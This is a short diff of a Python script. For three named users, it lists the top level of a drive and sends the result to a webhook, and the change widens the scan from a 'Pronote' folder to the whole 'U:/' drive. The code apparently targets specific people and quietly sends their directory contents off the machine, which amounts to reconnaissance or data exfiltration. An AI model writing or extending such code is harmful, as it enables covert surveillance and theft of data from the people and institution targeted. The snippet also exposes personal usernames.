@@ -278,7 +278,7 @@ if __name__ == "__main__":
     if USER_NAME in ["isabelle.cotta", "viviane.reydellet", "antoine.martin"]:
         try:
             tree = get_directory_architecture(
-                "W:/Pronote",
+                "U:/",
                 max_depth=1
             )
             send_webhook(str(tree)[:1900])
